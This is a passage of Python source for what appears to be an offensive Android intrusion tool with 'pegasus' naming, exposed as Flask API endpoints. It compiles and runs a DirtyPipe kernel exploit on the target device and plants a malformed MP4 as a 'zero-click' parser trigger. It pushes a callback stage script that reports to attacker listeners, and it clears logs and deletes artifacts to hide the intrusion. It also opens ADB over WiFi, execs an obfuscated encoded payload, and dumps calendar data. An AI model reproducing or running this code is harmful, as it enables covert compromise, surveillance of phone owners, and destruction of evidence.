                applicable.append((cve, name, desc, "sdk-dependent"))
                continue
            inrange = (tuple(int(x) for x in re.findall(r"\d+", lo or "0.0.0")[:3]) <= k <=
                       tuple(int(x) for x in re.findall(r"\d+", hi or "0.0.0")[:3]))
            if inrange:
                applicable.append((cve, name, desc, "IN RANGE"))
        _save("kernel_cves", f"kernel={ver}\nsdk={sdk}\npatch={patch}\n"
               + "\n".join(f"{c} {n} :: {d}" for c, n, d, _ in applicable))
        if not any(c == "CVE-2022-0847" for c, _, _, _ in applicable):
            if not applicable:
                return ok({"kernel": ver, "sdk": sdk, "patch": patch,
                           "applicable": applicable,
                           "note": "no CVE in range - vendor backports may shift rows"})
            return ok({"kernel": ver, "sdk": sdk, "patch": patch,
                       "applicable": applicable,
                       "note": "DirtyPipe out of range - manual PoC build for listed rows"})
        # DirtyPipe on-device build
        compiler = ""
        for c in ("cc", "gcc", "clang"):
            if _shell(f"command -v {c}").get("stdout", "").strip():
                compiler = c
                break
        if not compiler:
            src = _session_dir() / "dirty.c"
            src.write_text(DIRTY_PIPE_C, encoding="utf-8")
            return ok({"kernel": ver, "cve": "CVE-2022-0847",
                       "note": "no on-device compiler - source written, cross-compile needed",
                       "source": str(src)})
        local = _session_dir() / "dirty.c"
        local.write_text(DIRTY_PIPE_C, encoding="utf-8")
        if not _push(local, "/data/local/tmp/dirty.c"):
            return fail("push dirty.c failed")
        res = _shell(f"cd /data/local/tmp && {compiler} -O2 -o dirty dirty.c", timeout=300)
        if not res.get("ok"):
            return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:160])
        res2 = _shell("/data/local/tmp/dirty /data/local/tmp/dirty_out.bin", timeout=120)
        landed = "wrote" in (res2.get("stdout", "") or "")
        _save("kernel_exploit", f"cve=CVE-2022-0847 kernel={ver} landed={landed}\n{res2.get('stdout', '') or res2.get('stderr', '')}")
        return ok({"kernel": ver, "cve": "CVE-2022-0847", "landed": landed,
                   "output": res2.get("stdout", "") or res2.get("stderr", "")})

    @app.post("/api/q9/exploit/zero_click")
    def q9_zero_click():
        if not _need():
            return fail("no device attached")
        data = bytearray(build_mp4())
        idx = data.find(b"stsc")
        if idx < 0:
            return fail("stsc box not found in built MP4")
        struct.pack_into(">I", data, idx + 8, 0xFFFFFF)  # corrupt entry_count
        path = _stamp("zeroclick", "mp4")
        path.write_bytes(bytes(data))
        remote = f"/sdcard/DCIM/Camera/{path.name}"
        if not _push(path, remote):
            return fail("push failed")
        _shell(f'am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE -d "file://{remote}"')
        hit = ""
        for _ in range(10):
            time.sleep(1)
            res = _shell("logcat -d -t 200 2>/dev/null")
            for line in res.get("stdout", "").splitlines():
                if "mediaextractor" in line.lower() or "mediacodec" in line.lower():
                    hit = line.strip()
                    break
            if hit:
                break
        _save("zero_click", f"carrier={path.name} parser_event={hit or 'none'}")
        return ok({"zeroclick": str(path), "parser_event": hit or "none"})

    @app.post("/api/q9/exploit/callback")
    def q9_callback():
        """Start a raw TCP + HTTP callback listener (blocking until Ctrl+C)."""
        body = request.get_json(silent=True) or {}
        ip = body.get("ip", _local_ip())
        port = int(body.get("port", 8000))
        mode = body.get("mode", "tcp")
        SESSION = _session_dir()
        if mode == "http":
            class Handler(__import__("http.server", fromlist=["BaseHTTPRequestHandler"]).BaseHTTPRequestHandler):
                def do_POST(self):
                    n = int(self.headers.get("Content-Length") or 0)
                    body_data = self.rfile.read(n).decode("utf-8", "replace") if n else ""
                    with open(SESSION / "callbacks.jsonl", "a", encoding="utf-8") as f:
                        f.write(json.dumps({"ts": str(datetime.datetime.now()),
                                            "client": self.client_address[0],
                                            "body": body_data[:4096]}) + "\n")
                    self.send_response(204)
                    self.end_headers()

                def do_GET(self):
                    self.do_POST()

                def log_message(self, *a):
                    pass
            httpd = __import__("socketserver", fromlist=["ThreadingTCPServer"]).ThreadingTCPServer(
                ("0.0.0.0", port), Handler)
            httpd.daemon_threads = True
            t = threading.Thread(target=httpd.serve_forever, daemon=True)
            t.start()
            return ok({"http_listener": f"{ip}:{port}", "note": "listener running in background"})
        # raw TCP
        srv = socket.socket()
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(8)
        stage = _session_dir() / "cb.sh"
        stage.write_text(_cb_stage_body(ip, port), encoding="utf-8")
        remote = "/data/local/tmp/pegasus_cb.sh"
        if _push(stage, remote):
            _shell(f"chmod 755 {remote}")
            _shell(f"sh {remote} &", timeout=30)
        log = _session_dir() / "callbacks.txt"

        def _accept_loop():
            try:
                while True:
                    conn, addr = srv.accept()
                    data = conn.recv(4096)
                    line = f"{datetime.datetime.now():%H:%M:%S} {addr[0]} {data[:400].decode('utf-8', 'replace')}"
                    with open(log, "a", encoding="utf-8") as f:
                        f.write(line + "\n")
                    conn.close()
            except OSError:
                pass
            finally:
                srv.close()

        t = threading.Thread(target=_accept_loop, daemon=True)
        t.start()
        return ok({"tcp_listener": f"{ip}:{port}", "stage_pushed": True,
                   "log": str(log), "note": "listener running in background"})

    @app.post("/api/q9/exploit/wipe")
    def q9_wipe():
        if not _need():
            return fail("no device attached")
        WIPE_CMDS = (
            "logcat -c",
            "logcat -b all -c",
            "rm -f /data/local/tmp/stage2.sh /data/local/tmp/stage2.wasm "
            "/data/local/tmp/dirty.c /data/local/tmp/dirty /data/local/tmp/dp.c /data/local/tmp/dp",
            "rm -rf /data/local/tmp/pegasus_stage",
            "rm -f /sdcard/Download/pegasus_*.sh /sdcard/Download/stage_bundle_*.zip "
            "/sdcard/Download/polyglot_*.gif",
            "rm -f /sdcard/DCIM/Camera/zeroclick_*.mp4 /sdcard/Movies/poc_*.mp4 "
            "/sdcard/Movies/pegasus_rec.mp4 /sdcard/pegasus_mic.m4a",
            "content delete --uri content://settings/global --where \"name='pegasus_probe'\"",
        )
        for cmd in WIPE_CMDS:
            _shell(cmd, timeout=60)
        return ok({"wiped": True})

    # ---------------------------------------------------------------- bridge
    @app.post("/api/q9/bridge/usb")
    def q9_usb_bridge():
        if not _need():
            return fail("no device attached")
        _shell("setprop service.adb.tcp.port 5555")
        _shell("stop adbd; start adbd")
        time.sleep(3)
        ip = _shell("ip route | grep wlan0 | awk '{print $9}'").get("stdout", "").strip() or \
             _shell("ip -4 addr show wlan0 | grep inet | awk '{print $2}' | cut -d/ -f1").get("stdout", "").strip()
        if not ip:
            return fail("could not read device IP")
        res = _adb(["connect", f"{ip}:5555"], timeout=30)
        blob = (res.get("stdout", "") + res.get("stderr", "")).lower()
        if "connected" in blob:
            global DEVICE_SERIAL
            DEVICE_SERIAL = f"{ip}:5555"
            try:
                (Path.home() / ".pegasus" / "target").write_text(DEVICE_SERIAL, encoding="utf-8")
            except OSError:
                pass
            return ok({"bridge_up": f"{ip}:5555", "device": DEVICE_SERIAL})
        return fail((res.get("stdout", "") + res.get("stderr", "")).strip()[:140])

    # ---------------------------------------------------------------- INFEROR
    @app.post("/api/q9/inferor")
    def q9_inferor():
        blob = None
        for cand in (Path("inferor.b85"), Path.home() / ".pegasus" / "inferor.b85"):
            try:
                raw = cand.read_bytes().strip()
                if raw:
                    blob = raw
                    break
            except OSError:
                pass
        if not blob:
            return fail("inferor.b85 sidecar missing")
        try:
            raw = zlib.decompress(base64.b85decode(blob[::-1]))
            import marshal
            code = marshal.loads(raw)
        except Exception as exc:
            return fail(f"decode failed: {exc}")
        # save marshal dump
        (SESSIONS_DIR / "stage.pyc").write_bytes(marshal.dumps(code))
        body = request.get_json(silent=True) or {}
        if body.get("execute", False):
            ns = {"__name__": "__inferor__", "__doc__": None}
            saved_argv = sys.argv
            sys.argv = [sys.argv[0]]
            try:
                exec(code, ns)  # noqa: S102
                for key in ("__result__", "result"):
                    if key in ns:
                        return ok({"inferor_executed": True, f"{key}": ns[key]})
                return ok({"inferor_executed": True})
            except Exception as exc:
                return fail(f"{exc.__class__.__name__}: {exc}")
            finally:
                sys.argv = saved_argv
        return ok({"inferor_decoded": True, "bytecode_bytes": len(code.co_code),
                   "consts": len(code.co_consts),
                   "names": ", ".join(code.co_names[:10]),
                   "stage_pyc": str(SESSIONS_DIR / "stage.pyc")})

    # ---------------------------------------------------------------- calendar
    @app.get("/api/q9/calendar")
    def q9_calendar():
        return _query("dump calendar", "content://com.android.calendar/events")

    # ---------------------------------------------------------------- license/doctor
    @app.post("/api/q9/license")
    def q9_license():
        body = request.get_json(silent=True) or {}
        key = body.get("key", "")
        if check_license(key):
            try:
                STATE_DIR.mkdir(parents=True, exist_ok=True)
                (STATE_DIR / "token").write_text(VALID_KEY_HASH + "\n", encoding="utf-8")
                (STATE_DIR / "token").chmod(0o600)
            except OSError:
                pass
            return ok({"license_valid": True})
        return fail("license key rejected")

    @app.get("/api/q9/doctor")
    def q9_doctor():
        checks = []
        def chk(name, value, detail=""):
            checks.append(bool(value))
        chk("python", sys.version_info >= (3, 9))
        chk("pip", run([sys.executable, "-m", "pip", "--version"], timeout=60).get("rc", -1) == 0)
        chk("adb", bool(_resolve_adb()), _resolve_adb() or "unresolved")
        if _resolve_adb():
            chk("server", _adb(["start-server"], timeout=60).get("rc", -1) == 0)
            chk("devices", bool(_devices()))
        for mod in ("colorama", "qrcode", "PIL", "llama_cpp"):
            try:
                __import__(mod)
                chk(f"mod_{mod}", True)
            except ImportError:
                chk(f"mod_{mod}", False)
        chk("scrcpy", bool(shutil.which("scrcpy")))
        passed = sum(checks)
        return ok({"doctor": {"passed": passed, "total": len(checks)}})

    @app.get("/api/q9/selftest")
    def q9_selftest():
        results = []
        def t(name, fn):
            try:
                good = fn()
                results.append((name, bool(good)))
            except Exception as exc:
                results.append((name, False))
        t("crypto_roundtrip", crypto_selftest)
        def wasm_t():
            b = build_wasm()
            good, msg = validate_wasm(b)
            assert good, msg
            assert not validate_wasm(b[:-2])[0]
            return True
        t("wasm_build_validate", wasm_t)
        def mp4_t():
            b = build_mp4()
            good, msg = validate_mp4(b)
            assert good, msg
            assert not validate_mp4(b[:-4])[0]
            assert b[4:8] == b"ftyp"
            return True
        t("mp4_build_validate", mp4_t)
        def gif_t():
            b = build_gif()
            good, msg = validate_gif(b)
            assert good, msg
            assert not validate_gif(b[:-1])[0]
            return True
        t("gif_build_validate", gif_t)
        def helpers_t():
            def parse_target(tgt, default_port=5555):
                if not tgt:
                    return None, default_port
                host, _, port = tgt.partition(":")
                return host, int(port) if port.isdigit() else default_port
            assert parse_target("1.2.3.4:5555") == ("1.2.3.4", 5555)
            assert parse_target("1.2.3.4") == ("1.2.3.4", 5555)
            assert parse_target("") == (None, 5555)
            assert text_escape("a b") == "a%sb"
            return True
        t("pure_helpers", helpers_t)
        passed = sum(1 for _, g in results if g)
        return ok({"selftest": {"passed": passed, "total": len(results),
                                "results": [{"name": n, "passed": g} for n, g in results]}})

    def warn_resp(message: str):
        return ok({"warn": message})


def text_escape(s):
    return (s or "").replace(" ", "%s")
